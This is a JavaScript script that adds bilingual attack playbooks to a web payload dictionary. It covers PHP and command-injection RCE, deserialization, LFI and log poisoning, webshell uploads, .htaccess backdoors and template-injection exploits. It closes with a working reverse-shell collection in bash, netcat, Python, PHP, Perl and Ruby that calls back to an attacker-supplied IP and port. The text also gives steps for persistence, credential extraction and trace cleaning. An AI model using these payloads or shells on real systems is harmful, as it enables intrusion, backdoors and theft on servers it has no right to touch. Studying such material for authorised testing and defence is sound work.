import { readFileSync, writeFileSync } from 'fs';

const fp = 'src/data/webPayloads.ts';
let c = readFileSync(fp, 'utf8');
const esc = s => s.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&');

// ========== ENRICHMENT DATA ==========
const enrichments = {
  // === RCE ===
  'rce-command-injection': {
    ac: [
      ['识别注入点','Identify injection point','通过参数探测、功能分析和代理历史定位接受系统命令的入口，确认分隔符(;|&`\\\\n)是否被过滤。','Locate entry points accepting system commands and confirm which separators are filtered.'],
      ['基础命令探测','Basic command probe','使用 ;id、|whoami、`uname -a` 等基础命令测试注入，通过响应差异、时间延迟或 DNS 外带确认执行。','Test injection with basic commands; confirm via response differences, time delays, or DNS out-of-band.'],
      ['WAF 绕过','WAF bypass','当基础 payload 被拦截时尝试换行符(%0a)、IFS 替代空格、Base64 编码执行($(base64 -d))、反引号和通配符绕过。','When blocked, try newline injection, IFS alternatives, base64-encoded execution, backticks, and wildcard bypass.'],
      ['建立反向 Shell','Establish reverse shell','确认注入后使用 bash/python/perl/powershell 反向 shell 获取交互式会话；从字典中选取对应语言的反弹 shell 命令。','After confirming injection, establish an interactive session using language-appropriate reverse shells from the dictionary.'],
      ['后渗透与持久化','Post-exploitation','获取 shell 后收集内网信息、提取凭据(env/config/历史文件)、建立持久化(Crontab/SSH key)，清理痕迹。','Collect internal info, extract credentials, establish persistence (crontab/SSH keys), and clean traces.'],
    ],
    analy: { zh: '命令注入是最直接的RCE形式——用户输入进入system/exec/popen/shell_exec等函数时发生。攻击面包括管道、重定向、命令分隔符(;|&`\\\\n)、内联执行($()、``)和通配符注入。盲注场景依赖时间延迟(ping/sleep)或DNS外带(nslookup/curl dnslog)确认执行。', en: 'Command injection is the most direct RCE form, occurring when user input reaches system execution functions. Attack surface includes pipes, redirects, command separators, inline execution, and wildcard injection. Blind scenarios rely on time delays or DNS out-of-band.' },
    refs: ['https://owasp.org/www-community/attacks/Command_Injection','https://portswigger.net/web-security/os-command-injection','https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection'],
  },
  'rce-php': {
    ac: [
      ['定位代码执行入口','Locate code execution entry','通过黑盒调试和源码审计定位eval/assert/preg_replace/create_function等危险函数的调用点，确认用户输入能否进入。','Locate dangerous function call sites through debugging and source auditing; confirm user input reaches these functions.'],
      ['注入PHP一句话','Inject PHP one-liner','使用<?php system($_GET["cmd"]);?>获取命令执行，通过注释分割、回调函数、字符串拼接、Base64解码等绕过关键字检测。','Use PHP one-liners for command execution; bypass keyword detection via comment splitting, callbacks, string concatenation, and Base64 decoding.'],
      ['绕过disable_functions','Bypass disable_functions','当system/exec被禁用时利用LD_PRELOAD劫持、FFI::cdef、IMAP open绕过、GCONV_PATH等方式突破函数限制。','When system/exec are disabled, bypass via LD_PRELOAD hooking, FFI::cdef, IMAP open bypass, and GCONV_PATH techniques.'],
      ['建立持久化WebShell','Establish persistent WebShell','写入无字母数字shell、回调函数shell、反射调用shell等变体；添加.user.ini auto_prepend_file实现无文件后门。','Write polymorphic WebShells (non-alphanumeric, callback, reflection); add .user.ini auto_prepend_file for fileless backdoors.'],
    ],
    analy: { zh: 'PHP代码执行因eval/assert/preg_replace /e/create_function等函数接收用户输入导致。即使disable_functions限制system/exec，仍可通过LD_PRELOAD、FFI、IMAP绕过、GCONV路径等突破。PHP反序列化和Phar反序列化是独立RCE向量。', en: 'PHP code execution occurs when dangerous functions receive user input. Even with disable_functions restricting system/exec, bypasses exist via LD_PRELOAD, FFI, IMAP, and GCONV. PHP deserialization and Phar deserialization are independent RCE vectors.' },
    refs: ['https://owasp.org/www-community/attacks/Code_Injection','https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/PHP%20juggling%20type','https://book.hacktricks.wiki/en/pentesting-web/php-tricks-esp/index.html'],
  },
  'rce-php-filter': {
    ac: [
      ['确认Filter可用','Confirm filter availability','通过php://filter/read=convert.base64-encode/resource=index.php读取源码确认Filter可用，验证字符集转换支持。','Read source via php://filter to confirm filter availability and charset conversion support.'],
      ['生成Filter Chain','Generate filter chain','使用php_filter_chain_generator根据目标PHP版本生成完整Filter Chain，选择合适的字符集组合。','Use php_filter_chain_generator to generate a complete filter chain for the target PHP version.'],
      ['注入执行','Inject and execute','将生成的Filter Chain注入LFI参数，通过多层iconv转换逐字节拼出并执行PHP代码。','Inject the filter chain into the LFI parameter; PHP code is constructed and executed byte-by-byte through multi-layer iconv conversion.'],
      ['验证与利用','Verify and exploit','通过cmd参数执行命令确认成功，获取反向Shell或直接操作文件系统。','Confirm execution via cmd parameter, obtain a reverse shell, or directly manipulate the filesystem.'],
    ],
    analy: { zh: 'PHP Filter Chain利用php://filter的iconv字符集转换进行逐字节操作，在内存中拼出任意PHP代码。可绕过disable_functions和open_basedir，无需文件落地，是目前最先进的LFI-to-RCE技术。', en: 'PHP filter chains leverage iconv charset conversion for byte-by-byte manipulation, constructing PHP code in memory. This bypasses disable_functions and open_basedir without file writes — an advanced LFI-to-RCE technique.' },
    refs: ['https://github.com/synacktiv/php_filter_chain_generator','https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html'],
  },
  'rce-cmd-blind': {
    ac: [
      ['确认盲注场景','Confirm blind scenario','当命令输出不直接回显时通过请求时间差异、响应长度变化或错误信息判断是否存在注入点。','When output is not visible, judge injection via timing differences, response length changes, or error messages.'],
      ['时间延迟验证','Time-based verification','使用sleep 5、ping -n 5 127.0.0.1等延迟命令通过请求耗时确认命令被执行。','Use delay commands to confirm execution through request duration.'],
      ['DNS/HTTP外带','DNS/HTTP out-of-band','使用nslookup {DNSLOG}、curl http://{DNSLOG}/`whoami`等外带技术将执行结果传出。','Exfiltrate execution results via DNS or HTTP to a controlled server.'],
      ['写入WebShell','Write WebShell','确认注入后将一句话通过echo/printf写入Web可访问目录，再用浏览器触发执行。','Write a one-liner via echo/printf to a web-accessible directory and trigger execution via browser.'],
      ['建立反向连接','Establish reverse connection','使用bash/python/powershell反向shell获取交互式终端，优先尝试bash -i >& /dev/tcp和Python pty。','Obtain interactive terminal via reverse shell; prefer bash -i >& /dev/tcp and Python pty.'],
    ],
    analy: { zh: '盲命令注入无法直接看到输出，需通过侧信道确认：时间延迟(sleep/ping)、DNS外带(curl dnslog/`cmd`)、文件写入(> /var/www/html/s.php)。最可靠路径是写入WebShell或建立反向Shell。', en: 'Blind command injection requires side-channel confirmation: time delays, DNS out-of-band, or file writes. The most reliable path is writing a WebShell or establishing a reverse shell.' },
    refs: ['https://owasp.org/www-community/attacks/Command_Injection','https://portswigger.net/web-security/os-command-injection'],
  },
  'rce-deserialize': {
    ac: [
      ['识别序列化格式','Identify serialization format','通过魔术字节(Java aced0005、PHP O:N:、Python pickle)、Base64特征(rO0)和Content-Type识别序列化数据。','Identify serialized data via magic bytes (Java aced0005, PHP O:N:, Python pickle), Base64 patterns, and Content-Type.'],
      ['构造Gadget Chain','Construct gadget chain','使用ysoserial/PHPGGC/ysoserial.net等工具根据目标框架选择可利用的Gadget Chain。','Select exploitable gadget chains based on the target framework using ysoserial, PHPGGC, or ysoserial.net.'],
      ['触发反序列化','Trigger deserialization','将恶意序列化payload注入请求参数/Cookie/文件上传等入口，触发服务端反序列化执行。','Inject malicious serialized payloads into parameters, cookies, or file uploads to trigger server-side deserialization.'],
      ['绕过防护','Bypass defenses','当直接反序列化被WAF拦截时使用编码混淆、JNDI/LDAP重定向、BCEL ClassLoader等间接技术。','When direct deserialization is blocked, use encoding obfuscation, JNDI/LDAP redirects, or BCEL ClassLoader.'],
    ],
    analy: { zh: '不安全反序列化是OWASP Top 10高危漏洞。当应用反序列化不可信数据时，攻击者构造恶意序列化对象(POP链)触发任意方法调用实现RCE。Java/PHP/Python/.NET/Ruby各有成熟利用工具链。', en: 'Insecure deserialization is an OWASP Top 10 vulnerability. Malicious serialized objects (POP chains) trigger arbitrary method calls for RCE. Mature toolchains exist for Java, PHP, Python, .NET, and Ruby.' },
    refs: ['https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data','https://portswigger.net/web-security/deserialization','https://github.com/frohoff/ysoserial'],
  },
  'rce-deserialize-php': {
    ac: [
      ['识别反序列化点','Identify deserialization point','在参数/Cookie/Session中搜索序列化特征(O:N:"ClassName")，或通过phar://触发隐式反序列化。','Search for serialization patterns (O:N:"ClassName") in params/cookies/sessions, or trigger implicit deserialization via phar://.'],
      ['审计Gadget','Audit gadgets','通过源码审计或phpggc -l列举目标框架可利用的Gadget Chain，选择最适配路径。','Audit source or use phpggc -l to list exploitable chains; select the most suitable exploitation path.'],
      ['生成并注入Payload','Generate and inject payload','使用PHPGGC生成序列化payload，通过POST/Cookie/文件上传注入，注意参数匹配。','Generate serialized payloads with PHPGGC and inject via POST/cookie/file upload.'],
      ['升级为RCE','Escalate to RCE','触发反序列化后执行系统命令或写入WebShell，常见利用链：Monolog、SwiftMailer、Guzzle、Laravel。','After triggering deserialization, execute system commands or write a WebShell; common chains: Monolog, SwiftMailer, Guzzle, Laravel.'],
    ],
    analy: { zh: 'PHP反序列化依赖魔术方法(__destruct/__wakeup/__toString/__call/__invoke)。PHPGGC覆盖Laravel/ThinkPHP/WordPress/Monolog等框架的Gadget Chain。Phar://反序列化可在无显式unserialize()情况下触发。', en: 'PHP deserialization relies on magic method invocation. PHPGGC covers gadget chains for Laravel, ThinkPHP, WordPress, Monolog, and more. Phar:// deserialization triggers without explicit unserialize().' },
    refs: ['https://github.com/ambionics/phpggc','https://portswigger.net/web-security/deserialization/exploiting'],
  },
  'rce-deserialize-java': {
    ac: [
      ['识别Java序列化数据','Identify Java serialized data','搜索aced0005魔术字节、Base64编码rO0前缀、HTTP请求中的长二进制payload确认Java序列化。','Search for aced0005 magic bytes, Base64 rO0 prefix, and long binary payloads to identify Java serialization.'],
      ['DNS探测确认','DNS probe confirmation','使用URLDNS gadget chain触发DNS查询确认反序列化点存在，无需依赖漏洞库。','Use the URLDNS gadget chain to trigger DNS queries confirming deserialization without requiring vulnerable libraries.'],
      ['JNDI注入利用','JNDI injection exploitation','结合JNDI/LDAP注入(jndi:ldap://ATTACKER/Exploit)远程加载恶意类，绕过classpath限制。','Combine with JNDI/LDAP injection to remotely load malicious classes, bypassing classpath restrictions.'],
      ['ysoserial利用','ysoserial exploitation','根据目标组件选择CommonsCollections/CommonsBeanutils/Spring/Shiro等利用链生成最终payload。','Select exploitation chains (CommonsCollections, CommonsBeanutils, Spring, Shiro) based on target components.'],
    ],
    analy: { zh: 'Java反序列化以aced0005为特征。ysoserial提供CommonsCollections/URLDNS等链条。Log4Shell(CVE-2021-44228)是反序列化+JNDI组合攻击。Fastjson和Jackson的type auto-detection也可触发反序列化。', en: 'Java deserialization features aced0005 magic bytes. ysoserial provides multiple chains. Log4Shell is a deserialization+JNDI combo. Fastjson and Jackson type auto-detection can also trigger deserialization.' },
    refs: ['https://github.com/frohoff/ysoserial','https://portswigger.net/web-security/deserialization/exploiting','https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html'],
  },
  'rce-file-upload': {
    ac: [
      ['上传WebShell','Upload WebShell','通过文件上传功能将PHP/ASP/JSP一句话写入服务器，选择适合目标语言的WebShell变体。','Upload PHP/ASP/JSP one-liners through file upload; select the appropriate WebShell variant for the target language.'],
      ['绕过上传限制','Bypass upload restrictions','通过扩展名变体、Content-Type伪造、魔术字节注入(GIF89a)和平台解析特性突破三层验证。','Bypass three-layer validation via extension variants, Content-Type spoofing, magic byte injection, and platform parsing quirks.'],
      ['定位上传路径','Locate upload path','通过响应头、HTML回显、目录爆破找到上传文件的可访问URL。','Find the uploaded file accessible URL via response headers, HTML output, and directory brute-force.'],
      ['触发命令执行','Trigger command execution','通过HTTP请求传递cmd参数执行系统命令，建立反向Shell或持久化访问。','Execute system commands via HTTP with cmd parameter; establish a reverse shell or persistent access.'],
    ],
    analy: { zh: '文件上传RCE是最经典的Web攻击路径——写入WebShell后通过HTTP触发命令执行。PHP一句话(<?php system($_GET["cmd"]);?>)、ASPX、JSP、Python各有变体。成功关键：绕过扩展名/MIME/内容三层验证，确保目录可执行脚本。', en: 'File upload RCE is the most classic web attack path — write a WebShell and trigger via HTTP. Variants exist for PHP, ASPX, JSP, and Python. Success depends on bypassing extension, MIME, and content validation.' },
    refs: ['https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload','https://github.com/tennc/webshell','https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files'],
  },
  'rce-include': {
    ac: [
      ['识别包含点','Identify include point','定位?page=/file=/include=参数，测试路径遍历和PHP伪协议确认LFI存在。','Locate include parameters; test path traversal and PHP wrappers to confirm LFI.'],
      ['读取源码','Read source code','通过php://filter base64读取PHP源码，发现数据库凭据、文件路径和其他注入点。','Read PHP source via php://filter base64 to discover credentials, file paths, and additional injection points.'],
      ['升级LFI到RCE','Escalate LFI to RCE','尝试php://input注入、data://伪协议、日志投毒和Session文件包含等路径升级为RCE。','Escalate to RCE via php://input injection, data:// pseudo-protocol, log poisoning, and session file inclusion.'],
      ['建立持久访问','Establish persistent access','写入WebShell或修改系统配置(Crontab/authorized_keys/.user.ini)建立持久化通道。','Write a WebShell or modify system configuration for persistent access.'],
    ],
    analy: { zh: '文件包含(LFI)本身只能读文件，但可升级为RCE：php://input注入代码、data://伪协议执行、日志投毒、Session文件包含、PHP Filter Chain和/proc/self/environ注入。RFI则直接通过HTTP/FTP加载远程代码。', en: 'LFI itself only reads files but can escalate to RCE: php://input, data://, log poisoning, session inclusion, PHP filter chains, and /proc/self/environ injection. RFI directly loads remote code via HTTP/FTP.' },
    refs: ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion','https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html'],
  },
  'rce-log-poison': {
    ac: [
      ['识别日志路径','Identify log paths','确认服务器类型和日志路径(/var/log/apache2/access.log、/var/log/nginx/access.log、SSH auth.log)。','Identify server type and log paths (Apache, Nginx, SSH auth).'],
      ['注入PHP代码','Inject PHP code','在User-Agent/Referer/URL中携带<?php system($_GET["cmd"]);?>访问目标触发日志写入。','Carry PHP code in User-Agent/Referer/URL and access the target to trigger log writes.'],
      ['包含污染日志','Include poisoned log','通过LFI参数包含日志文件路径，注入的PHP代码被解析执行。','Include the log file via LFI; the injected PHP code is parsed and executed.'],
      ['获取Shell','Obtain shell','执行成功后通过cmd参数获取命令执行，随后建立反向Shell或更高权限。','After execution, pass cmd parameter for command execution, then establish a reverse shell or escalate.'],
    ],
    analy: { zh: '日志投毒是LFI-to-RCE最高效路径。在User-Agent/Referer/URL中注入PHP代码写入日志后通过LFI包含执行。目标：Apache/Nginx访问日志、SSH auth.log、邮件日志。注意日志可能被rotate，需多次尝试。', en: 'Log poisoning is the most efficient LFI-to-RCE path. Inject PHP code into logs via User-Agent/Referer/URL, then include via LFI. Targets: Apache/Nginx access logs, SSH auth.log, mail logs.' },
    refs: ['https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-log-poisoning.html'],
  },
  'rce-image': {
    ac: [
      ['制作图片马','Create image webshell','使用copy /b normal.jpg+shell.php webshell.jpg(GIF89a+PHP)或exiftool -Comment注入代码。','Create image webshells using copy /b (GIF89a+PHP) or exiftool -Comment for code injection.'],
      ['上传图片马','Upload image webshell','通过头像/相册上传图片马，利用合法扩展名和魔术字节绕过内容检查。','Upload via avatar/album features using legitimate extensions and magic bytes to bypass content checks.'],
      ['LFI包含执行','LFI include execution','通过文件包含漏洞引用上传的图片马，嵌入的PHP代码被解析执行。','Reference the uploaded image shell via LFI; embedded PHP code is parsed and executed.'],
      ['解析漏洞利用','Parser exploitation','配合.htaccess AddType或IIS路径解析漏洞使图片直接被当作脚本执行。','Combine with .htaccess AddType or IIS path parsing to execute images directly as scripts.'],
    ],
    analy: { zh: '图片马在合法图片内嵌入PHP/ASP代码绕过内容检测。制作：copy /b、exiftool注入、手写文件头+代码。需配合LFI或解析漏洞(.htaccess AddType/IIS解析)使图片被当作脚本执行。', en: 'Image webshells embed code within legitimate images to bypass content detection. Requires LFI or parsing vulnerabilities to make images execute as scripts.' },
    refs: ['https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html','https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload'],
  },
  'rce-htaccess': {
    ac: [
      ['上传.htaccess','Upload .htaccess','通过文件上传上传恶意.htaccess，使用text/plain Content-Type绕过类型检查。','Upload malicious .htaccess with text/plain Content-Type to bypass type checks.'],
      ['配置AddType映射','Configure AddType mapping','AddType application/x-httpd-php .jpg使所有.jpg被当作PHP执行；或用SetHandler强制。','Use AddType to map .jpg to PHP, or SetHandler to force all files.'],
      ['上传图片WebShell','Upload image WebShell','上传含PHP代码的.jpg文件，由于.htaccess规则被当作PHP脚本执行。','Upload a .jpg containing PHP code; due to .htaccess rules, it executes as a PHP script.'],
      ['.user.ini持久化','.user.ini persistence','针对PHP-FPM上传.user.ini设auto_prepend_file=shell.jpg，所有PHP页面自动包含后门。','For PHP-FPM, upload .user.ini with auto_prepend_file=shell.jpg for automatic backdoor inclusion.'],
    ],
    analy: { zh: '.htaccess是Apache分布式配置文件。攻击者上传恶意.htaccess覆盖目录解析规则，使图片被当作PHP执行。.user.ini(PHP-FPM)可通过auto_prepend_file实现无文件后门。这类攻击隐蔽持久，常被忽视。', en: '.htaccess is Apache distributed config. Malicious uploads override directory parsing. .user.ini enables fileless backdoors via auto_prepend_file. These attacks are stealthy, persistent, and often overlooked.' },
    refs: ['https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html','https://httpd.apache.org/docs/current/howto/htaccess.html'],
  },

  // === SSTI ===
  'ssti-jinja2': {
    ac: [['确认Jinja2引擎','Identify Jinja2 engine',"通过{{7*7}}、{{config}}、{{''.__class__}}等探针确认模板引擎为Jinja2。","Confirm Jinja2 via {{7*7}}, {{config}}, {{''.__class__}} probes."],['对象遍历','Object traversal','通过__class__.__mro__.__subclasses__()链查找os._wrap_close或subprocess.Popen等可利用类。','Traverse __class__.__mro__.__subclasses__() to find exploitable classes.',''],['构造RCE Payload','Construct RCE payload','利用找到的类构造命令执行payload，如通过Popen执行id/whoami。','Construct command execution payload using found classes.'],['建立反向Shell','Establish reverse shell','使用Python反向Shell payload通过SSTI执行，获取交互式终端。','Execute Python reverse shell via SSTI for interactive terminal.']],
    analy: { zh: 'Jinja2 SSTI通过对象遍历链(__class__/__mro__/__subclasses__)找到可执行系统命令的类(如subprocess.Popen、os._wrap_close)。Flask应用自动注入config/request等对象，为利用提供入口。', en: 'Jinja2 SSTI traverses object chains to find classes capable of system command execution. Flask auto-injects config/request objects, providing exploitation entry points.' },
    refs: ['https://portswigger.net/web-security/server-side-template-injection','https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html'],
  },
  'ssti-freemarker': {
    ac: [['确认FreeMarker','Identify FreeMarker',"通过${7*7}、${.now}等探针确认FreeMarker引擎。","Confirm FreeMarker via ${7*7}, ${.now} probes."],['利用Execute类','Exploit Execute class','使用<#assign ex="freemarker.template.utility.Execute"?new()>获取命令执行对象。','Use Execute class for command execution.'],['执行命令','Execute commands','通过${ex("id")}执行系统命令确认RCE。','Execute system commands via ${ex("id")} to confirm RCE.'],['反弹Shell','Reverse shell','使用Execute执行bash/python反向Shell获取交互式终端。','Use Execute to run bash/python reverse shell for interactive terminal.']],
    analy: { zh: 'FreeMarker SSTI通过freemarker.template.utility.Execute类直接执行系统命令。此外ObjectConstructor可实例化任意Java类，JythonRuntime可执行Python代码，扩展利用面。', en: 'FreeMarker SSTI directly executes system commands via Execute utility class. ObjectConstructor and JythonRuntime extend the exploitation surface.' },
    refs: ['https://portswigger.net/web-security/server-side-template-injection','https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html'],
  },
  'ssti-velocity': { ac: [['确认Velocity','Identify Velocity',"通过#set($x=7*7)$x等探针确认Velocity。","Confirm Velocity via #set($x=7*7)$x probes."],['反射调用','Reflection invocation','使用Class.forName执行Java反射调用获取Runtime。','Use Class.forName for Java reflection to obtain Runtime.'],['执行命令','Execute commands','通过Runtime.getRuntime().exec()执行系统命令。','Execute system commands via Runtime.getRuntime().exec().'],['反弹Shell','Reverse shell','使用Java反向Shell或通过curl/wget下载执行恶意脚本。','Use Java reverse shell or download/execute malicious scripts via curl/wget.']], analy: { zh: 'Velocity SSTI通过Java反射机制获取Runtime.exec()执行系统命令。也可利用Class.forName加载任意Java类实现更复杂的攻击。', en: 'Velocity SSTI obtains Runtime.exec() via Java reflection for system command execution. Class.forName can load arbitrary Java classes for more complex attacks.' }, refs: ['https://portswigger.net/web-security/server-side-template-injection'] },
  'ssti-thymeleaf': { ac: [['确认Thymeleaf','Identify Thymeleaf',"通过${7*7}、*{name}等探针确认Thymeleaf。","Confirm Thymeleaf via ${7*7}, *{name} probes."],['利用Spring EL','Exploit Spring EL','使用T()操作符调用Java静态方法获取Runtime。','Use T() operator to call Java static methods for Runtime.'],['执行命令','Execute commands','T(java.lang.Runtime).getRuntime().exec("id")执行命令。','Execute commands via Runtime.exec().'],['反弹Shell','Reverse shell','通过Spring EL执行反向Shell或写入JSP WebShell。','Execute reverse shell via Spring EL or write JSP WebShell.']], analy: { zh: 'Thymeleaf SSTI通过Spring Expression Language(T())调用Java静态方法。结合Spring Boot Actuator等端点可构造更复杂的利用链。', en: 'Thymeleaf SSTI calls Java static methods via Spring EL (T()). Combined with Spring Boot Actuator endpoints, more complex chains can be constructed.' }, refs: ['https://portswigger.net/web-security/server-side-template-injection'] },
  'ssti-smarty': { ac: [['确认Smarty','Identify Smarty',"通过{7*7}、{\$smarty.version}确认Smarty。","Confirm Smarty via {7*7}, {\\$smarty.version}."],['利用PHP函数','Exploit PHP functions','使用{system("id")}或{php}system("id"){/php}执行命令。','Execute commands via {system("id")} or {php}system("id"){/php}.'],['读取文件','Read files','使用{include file="file:///etc/passwd"}或{fetch file="..."}读取文件。','Read files via {include} or {fetch}.'],['反弹Shell','Reverse shell','通过system()执行bash/python反弹Shell获取交互终端。','Execute bash/python reverse shell via system() for interactive terminal.']], analy: { zh: 'Smarty SSTI在{php}标签内可直接执行PHP代码。security.enable=false时可调用任意PHP函数。{include}和{fetch}可读取或包含任意文件。', en: 'Smarty SSTI executes PHP code directly within {php} tags. When security.enable=false, arbitrary PHP functions are callable. {include} and {fetch} can read or include arbitrary files.' }, refs: ['https://portswigger.net/web-security/server-side-template-injection'] },
  'ssti-mako': { ac: [['确认Mako','Identify Mako',"通过${7*7}、${self}等探针确认Mako。","Confirm Mako via ${7*7}, ${self}."],['利用Python执行','Exploit Python execution','使用<% import os %>\\n${os.system("id")}执行系统命令。','Execute commands via inline Python with os.system().'],['执行命令','Execute commands','通过os.popen()或subprocess执行命令并获取输出。','Execute and capture output via os.popen() or subprocess.'],['反弹Shell','Reverse shell','使用Python反向Shell payload通过SSTI执行。','Execute Python reverse shell via SSTI.']], analy: { zh: 'Mako SSTI通过<% %>标签内联Python代码执行任意命令。可导入os/subprocess等模块并在${}中调用。与Jinja2不同，Mako直接支持Python代码块注入。', en: 'Mako SSTI executes arbitrary commands via inline Python in <% %> tags. os/subprocess modules can be imported and called. Unlike Jinja2, Mako directly supports Python code block injection.' }, refs: ['https://portswigger.net/web-security/server-side-template-injection'] },
  'ssti-tornado': { ac: [['确认Tornado','Identify Tornado',"通过{{7*7}}、{{handler}}确认Tornado。","Confirm Tornado via {{7*7}}, {{handler}}."],['利用Python执行','Exploit Python execution','使用{% import os %}{{os.system("id")}}执行命令。','Execute commands via os.system() in template tags.'],['执行命令','Execute commands','通过os.popen()执行并获取输出，或使用subprocess。','Execute and capture output via os.popen() or subprocess.'],['反弹Shell','Reverse shell','使用Python反向Shell payload通过SSTI执行。','Execute Python reverse shell via SSTI.']], analy: { zh: 'Tornado SSTI通过{% import os %}导入模块后执行系统命令。Tornado模板支持完整的Python表达式，攻击面包括文件读写、命令执行和网络连接。', en: 'Tornado SSTI imports modules via {% import os %} for command execution. Tornado templates support full Python expressions with files, commands, and network access.' }, refs: ['https://portswigger.net/web-security/server-side-template-injection'] },
  'ssti-django': { ac: [['确认Django','Identify Django',"通过{{7*7}}、{{request}}确认Django。","Confirm Django via {{7*7}}, {{request}}."],['利用Django对象','Exploit Django objects','利用debug标签泄露敏感信息，或通过找到的类构造命令执行。','Exploit debug tags for info leak, or construct command execution via discovered classes.'],['执行命令','Execute commands','通过对象遍历链找到可利用类后执行系统命令。','Execute system commands after finding exploitable classes via object traversal.'],['反弹Shell','Reverse shell','使用Python反向Shell payload执行。','Execute Python reverse shell payload.']], analy: { zh: 'Django模板SSTI较严格（自动转义+有限标签），但配合debug标签({% debug %})和对象遍历链仍可泄露配置信息并在特定条件下实现RCE。', en: 'Django template SSTI is stricter (auto-escaping + limited tags) but can still leak config via {% debug %} and achieve RCE under specific conditions via object traversal.' }, refs: ['https://portswigger.net/web-security/server-side-template-injection'] },
  'ssti-erb': { ac: [['确认ERB','Identify ERB',"通过<%= 7*7 %>确认ERB。","Confirm ERB via <%= 7*7 %>."],['利用Ruby执行','Exploit Ruby execution','使用<%= system("id") %>执行系统命令。','Execute commands via <%= system("id") %>.'],['执行命令','Execute commands','通过%x(id)、exec("id")或IO.popen执行命令。','Execute via %x(id), exec("id"), or IO.popen.'],['反弹Shell','Reverse shell','使用Ruby反向Shell payload获取交互终端。','Obtain interactive terminal via Ruby reverse shell.']], analy: { zh: 'ERB SSTI通过<%= %>直接内嵌Ruby代码执行。system()、exec()、%x()、IO.popen均可执行系统命令。Ruby的File.open还可读取任意文件。', en: 'ERB SSTI executes Ruby code directly via <%= %>. system(), exec(), %x(), and IO.popen all execute system commands. File.open can read arbitrary files.' }, refs: ['https://portswigger.net/web-security/server-side-template-injection'] },
  'ssti-pug': { ac: [['确认Pug','Identify Pug',"通过#{7*7}确认Pug。","Confirm Pug via #{7*7}."],['利用Node.js执行','Exploit Node.js','使用- var x = require("child_process").execSync("id")执行命令。','Execute via child_process module.'],['全局对象遍历','Global object traversal','通过global.process.mainModule.require访问require函数。','Access require via global.process.mainModule.require.'],['反弹Shell','Reverse shell','使用Node.js反向Shell payload获取交互终端。','Obtain interactive terminal via Node.js reverse shell.']], analy: { zh: 'Pug/Jade SSTI通过-前缀注入JavaScript代码。可访问require()加载child_process模块执行命令。结合原型链污染可触发更深层的RCE。', en: 'Pug/Jade SSTI injects JavaScript via - prefix. require() loads child_process for command execution. Combined with prototype pollution, deeper RCE can be triggered.' }, refs: ['https://portswigger.net/web-security/server-side-template-injection'] },
};

// ========== EXECUTION COMMAND ENRICHMENT ==========

// rce-command-injection: Add comprehensive reverse shell collection
const revShellCmd = `# === Bash TCP ===
bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
bash -c "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"
exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do \$line 2>&5 >&5; done
0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196

# === Netcat ===
nc -e /bin/sh {IP} {PORT}
nc -e /bin/bash {IP} {PORT}
nc -c sh {IP} {PORT}
nc.exe -e cmd {IP} {PORT}
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f

# === Python ===
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
export RHOST="{IP}";export RPORT={PORT};python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

# === PHP ===
php -r '\$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '\$sock=fsockopen("{IP}",{PORT});system("/bin/sh -i <&3 >&3 2>&3");'
php -r '\$sock=fsockopen("{IP}",{PORT});passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '\$sock=fsockopen("{IP}",{PORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");'

# === Perl ===
perl -e 'use Socket;\$i="{IP}";\$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# === Ruby ===
ruby -rsocket -e'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'c=TCPSocket.new("{IP}","{PORT}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# === PowerShell ===
